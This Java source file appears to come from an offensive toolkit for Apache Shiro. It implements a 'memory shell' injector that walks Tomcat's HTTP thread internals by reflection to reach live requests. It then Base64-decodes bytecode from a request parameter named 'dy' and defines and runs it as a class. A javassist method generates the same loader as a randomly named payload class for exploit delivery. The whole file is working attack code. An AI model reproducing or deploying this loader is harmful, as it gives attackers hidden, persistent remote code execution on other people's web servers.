package core.memshell;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewConstructor;
import org.apache.shiro.codec.Base64;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;

public class ShiroMemShell {
    private static Object getFV(Object o, String s) throws Exception {
        Field f = null;
        Class clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                f = clazz.getDeclaredField(s);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (f == null) {
            throw new NoSuchFieldException(s);
        } else {
            f.setAccessible(true);
            return f.get(o);
        }
    }

    public ShiroMemShell() {
        try {
            String dy = null;
            boolean done = false;
            Thread[] ts = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads"));
            for (int i = 0; i < ts.length; ++i) {
                Thread t = ts[i];
                if (t != null) {
                    String s = t.getName();
                    if (!s.contains("exec") && s.contains("http")) {
                        Object o = getFV(t, "target");
                        if (o instanceof Runnable) {
                            try {
                                o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");
                            } catch (Exception var16) {
                                continue;
                            }
                            List ps = (List) getFV(o, "processors");
                            for (int j = 0; j < ps.size(); ++j) {
                                Object p = ps.get(j);
                                o = getFV(p, "req");
                                Object resp = o.getClass().getMethod("getResponse").invoke(o);
                                Object conreq = o.getClass().getMethod("getNote", Integer.TYPE).invoke(o, new Integer(1));
                                dy = (String) conreq.getClass().getMethod("getParameter", String.class).invoke(conreq, new String("dy"));
                                if (dy != null && !dy.isEmpty()) {
                                    System.out.println("dy:" + dy);
                                    byte[] bytecodes = Base64.decode(dy);
                                    Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                                    defineClassMethod.setAccessible(true);
                                    Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), bytecodes, new Integer(0), new Integer(bytecodes.length));
                                    cc.newInstance().equals(conreq);
                                    done = true;
                                }
                                if (done) {
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception var17) {
        }
    }

    public CtClass genPayload(ClassPool pool) throws Exception {
        CtClass clazz = pool.makeClass("x.Test" + System.nanoTime());
        if ((clazz.getDeclaredConstructors()).length != 0)
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        clazz.addMethod(CtMethod.make("    private static Object getFV(Object o, String s) throws Exception {\n        java.lang.reflect.Field f = null;\n        Class clazz = o.getClass();\n        while (clazz != Object.class) {\n            try {\n                f = clazz.getDeclaredField(s);\n                break;\n            } catch (NoSuchFieldException e) {\n                clazz = clazz.getSuperclass();\n            }\n        }\n        if (f == null) {\n            throw new NoSuchFieldException(s);\n        }\n        f.setAccessible(true);\n        return f.get(o);\n}", clazz));
        clazz.addConstructor(CtNewConstructor.make("    public InjectMemTool() {\n        try {\n Object o;\n            String s;\n            String dy = null;\n            Object resp;\n            boolean done = false;\n            Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\");\n            for (int i = 0; i < ts.length; i++) {\n                Thread t = ts[i];\n                if (t == null) {\n                    continue;\n                }\n                s = t.getName();\n                if (!s.contains(\"exec\") && s.contains(\"http\")) {\n                    o = getFV(t, \"target\");\n                    if (!(o instanceof Runnable)) {\n                        continue;\n                    }\n\n                    try {\n                        o = getFV(getFV(getFV(o, \"this$0\"), \"handler\"), \"global\");\n                    } catch (Exception e) {\n                        continue;\n                    }\n\n                    java.util.List ps = (java.util.List) getFV(o, \"processors\");\n                    for (int j = 0; j < ps.size(); j++) {\n                        Object p = ps.get(j);\n                        o = getFV(p, \"req\");\n                        resp = o.getClass().getMethod(\"getResponse\", new Class[0]).invoke(o, new Object[0]);\n\n                        Object conreq = o.getClass().getMethod(\"getNote\", new Class[]{int.class}).invoke(o, new Object[]{new Integer(1)});\n\n                        dy = (String) conreq.getClass().getMethod(\"getParameter\", new Class[]{String.class}).invoke(conreq, new Object[]{new String(\"dy\")});\n\n                        if (dy != null && !dy.isEmpty()) {\n                            byte[] bytecodes = org.apache.shiro.codec.Base64.decode(dy);\n\n                            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});\n                            defineClassMethod.setAccessible(true);\n\n                            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), new Object[]{bytecodes, new Integer(0), new Integer(bytecodes.length)});\n\n                            cc.newInstance().equals(conreq);\n                            done = true;\n                        }\n                        if (done) {\n                            break;\n                        }\n                    }\n                }\n            }\n        } catch (Exception e) {\n            ;\n        }\n}", clazz));
        return clazz;
    }
}
